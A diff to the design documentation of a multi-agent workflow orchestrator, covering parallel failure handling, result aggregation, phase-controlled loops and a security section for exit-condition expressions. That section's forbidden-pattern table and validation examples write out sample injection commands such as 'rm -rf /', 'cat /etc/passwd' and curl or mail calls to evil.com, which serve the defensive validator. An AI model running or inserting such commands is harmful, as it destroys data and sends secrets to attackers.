@@ -591,6 +591,96 @@ phase_metadata:
 
 This design ensures that parallel execution is orchestrated at the system level, not within individual agent contexts, maintaining predictable execution and debuggability.
 
+### Parallel Error Handling and Result Aggregation
+
+When executing phases in parallel mode, the orchestrator must handle partial failures and aggregate results from multiple agents.
+
+#### Error Handling Strategy
+
+**Default Behavior** (All-or-Nothing):
+- All parallel agents must complete successfully for the phase to succeed
+- If ANY agent fails, the entire parallel phase is marked as FAILED
+- Failed work items are identified in the error report
+- Phase can be retried if `allow_retry: true` in workflow.yaml
+
+**Partial Success Handling**:
+```yaml
+# In phase completion report from orchestrator
+phase_completion:
+  status: FAILURE
+  errors:
+    - "3 of 10 work items failed processing"
+    - "Failed items: FEAT-003.md, FEAT-007.md, FEAT-009.md"
+  notes:
+    - "7 items processed successfully"
+    - "Outputs created for successful items available at $OUTPUT_DIR/specs/"
+```
+
+#### Result Aggregation Rules
+
+**File Outputs**:
+1. Orchestrator collects all output files from successful agents
+2. Failed agents' partial outputs are NOT included in aggregation
+3. Output count is verified against expected count (total work items)
+4. If count mismatch, phase status is FAILURE with specific error
+
+**Parameter Discovery**:
+1. Parameters discovered by each agent are merged into a unified set
+2. Numeric parameters are aggregated using specified strategy:
+   - **Count aggregation** (default): `SPECS_COUNT = total_successful_agents`
+   - **Sum aggregation**: `TOTAL_SIZE = sum(SIZE_1, SIZE_2, ..., SIZE_N)`
+   - **List aggregation**: `GENERATED_FILES = [file_1, file_2, ..., file_N]`
+3. Conflicting parameter values trigger WARNING with last-write-wins behavior
+4. Aggregated parameters are written to runtime-parameters.yaml
+
+**Aggregation Example**:
+```yaml
+# Agent 1 completion report
+parameters_discovered:
+  FEATURE_COUNT: 1
+  VALIDATION_PASSED: true
+
+# Agent 2 completion report
+parameters_discovered:
+  FEATURE_COUNT: 1
+  VALIDATION_PASSED: true
+
+# Agent 3 completion report (failed)
+# Not included in aggregation
+
+# Orchestrator aggregated result (2 successful, 1 failed)
+parameters_discovered:
+  FEATURE_COUNT: 2          # Sum of successful agents
+  VALIDATION_PASSED: true   # Consistent across agents
+  FAILED_COUNT: 1           # Orchestrator adds failure tracking
+  TOTAL_ITEMS: 3            # Total work items discovered
+```
+
+#### Retry Behavior for Parallel Phases
+
+When `allow_retry: true`:
+1. **Full Retry**: All work items re-executed (including previously successful)
+2. **Selective Retry**: Only failed work items re-executed (orchestrator tracks state)
+3. Default is **Full Retry** for simplicity and idempotency
+
+**Selective Retry** (future enhancement):
+- Orchestrator maintains state file tracking successful items
+- Only failed items included in retry discovery pattern
+- Useful for expensive, idempotent operations
+
+#### Progress Reporting
+
+During parallel execution, orchestrator provides:
+```
+[PARALLEL PHASE] Launching 10 agents for phase-02-transform.md
+[AGENT PROGRESS] 3/10 completed (30%)
+[AGENT PROGRESS] 7/10 completed (70%)
+[AGENT PROGRESS] 9/10 completed (90%)
+[AGENT FAILURE] Agent for FEAT-007.md failed: Schema validation error
+[PARALLEL PHASE] Completed: 9 successful, 1 failed
+[PHASE FAILURE] Phase-02 failed due to agent failures
+```
+
 ## Loop Execution
 
 ### Overview
@@ -633,6 +723,39 @@ When evaluating whether to continue a loop after completing the last phase:
 3. **exit_condition** (declarative exit): Optional expression evaluated by orchestrator after each iteration
 4. **iterations** (fixed count): Default behavior - loop exactly N times if no override
 5. **Default**: Exit loop if no control mechanism specified
+
+### Loops Without Explicit Control Mechanism
+
+A loop configuration may omit both `iterations` and `exit_condition` fields. This is **valid** when `allow_phase_control: true` (the default), allowing phases to have full control via `LOOP_CONTINUE` parameter.
+
+**Valid Configuration**:
+```yaml
+loops:
+  - name: adaptive-refinement
+    phases: [2, 3, 4]
+    max_iterations: 20
+    allow_phase_control: true  # Phases control loop via LOOP_CONTINUE
+    # No iterations or exit_condition - phase-driven control
+```
+
+**Behavior**:
+- Loop exits after first iteration unless phase sets `LOOP_CONTINUE: true`
+- Useful for adaptive workflows where exit criteria are too complex for declarative expressions
+- Phases must implement loop control logic and set `LOOP_CONTINUE` parameter
+
+**Invalid Configuration**:
+```yaml
+loops:
+  - name: broken-loop
+    phases: [2, 3]
+    max_iterations: 10
+    allow_phase_control: false  # ERROR: No control mechanism available
+    # No iterations or exit_condition AND phase control disabled
+```
+
+**Validation Rules**:
+- **ERROR**: If `allow_phase_control: false` AND no `iterations` AND no `exit_condition`
+- **INFO**: If `allow_phase_control: true` AND no `iterations` AND no `exit_condition` → Suggest documenting phase control logic
 
 ### Phase Override Protocol
 
@@ -691,6 +814,51 @@ Literals:
 - Numbers: `42`, `3.14`, `-5.2`
 - Strings: `'value'` or `"value"` (quoted)
 - Booleans: `true`, `false`
+
+**Security Constraints**:
+
+Exit condition expressions are evaluated in a controlled environment to prevent injection attacks. The following characters and patterns are **forbidden**:
+
+| Forbidden Pattern | Reason | Example Attack |
+|-------------------|--------|----------------|
+| `;` (semicolon) | Command chaining | `$DELTA < 0.1; rm -rf /` |
+| `\|` (pipe) | Command piping | `$STATUS == 'done' \| mail attacker@evil.com` |
+| `&` (ampersand, except in `&&`) | Background execution | `$VALUE > 0 & malicious-script` |
+| `` ` `` (backtick) | Command substitution | ``$COUNT == `cat /etc/passwd \| wc -l` `` |
+| `$(...)` (except `$PARAM`) | Command substitution | `$THRESHOLD == $(curl evil.com/cmd)` |
+| `<(...)` | Process substitution | `$DATA < <(malicious-generator)` |
+| `>(...)` | Process substitution | `$RESULT > >(logger --server evil.com)` |
+| `<`, `>`, `<<`, `>>` (except comparison) | File redirection | `$VALUE > 0 > /tmp/exfiltrate` |
+| `eval`, `exec`, `source` | Code execution | `eval $MALICIOUS_CODE` |
+
+**Validation Process**:
+1. **Pattern Scanning**: Expression is scanned for forbidden patterns before workflow execution
+2. **Parameter Isolation**: Only declared parameters from `workflow.yaml` are allowed
+3. **Operator Whitelisting**: Only explicitly allowed operators (`<`, `>`, `<=`, `>=`, `==`, `!=`, `&&`, `||`, `!`) are permitted
+4. **Safe Evaluation**: Expressions are translated to isolated bash/bc evaluation with no variable expansion
+5. **Sandboxed Execution**: Evaluation occurs in restricted context with no network or file system access
+
+**Validation Examples**:
+```yaml
+# VALID - Safe numeric comparison
+exit_condition:
+  expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"
+
+# INVALID - Command substitution attempt
+exit_condition:
+  expression: "$COUNT == $(wc -l < file.txt)"
+  # ERROR: Command substitution $(... detected
+
+# INVALID - Command chaining attempt
+exit_condition:
+  expression: "$STATUS == 'done'; curl evil.com"
+  # ERROR: Forbidden character ';' detected
+
+# INVALID - Undeclared parameter
+exit_condition:
+  expression: "$UNDECLARED_VAR < 10"
+  # ERROR: Parameter UNDECLARED_VAR not found in workflow.yaml
+```
 
 **Expression Examples**:
 ```yaml
@@ -769,6 +937,8 @@ The orchestrator automatically injects these parameters for all phases within a 
 | `LOOP_INDEX` | integer | Current iteration number (1-based) | 3 |
 | `LOOP_NAME` | string | Loop identifier | "refinement-loop" |
 | `LOOP_ITERATION` | integer | Alias for LOOP_INDEX | 3 |
+
+**Injection Timing**: These parameters are injected before the FIRST iteration (starting with `LOOP_INDEX=1`) and updated before each subsequent iteration. All loop phases have access to these parameters from iteration 1 onward.
 
 These parameters are available for conditional logic and logging within loop phases.
 
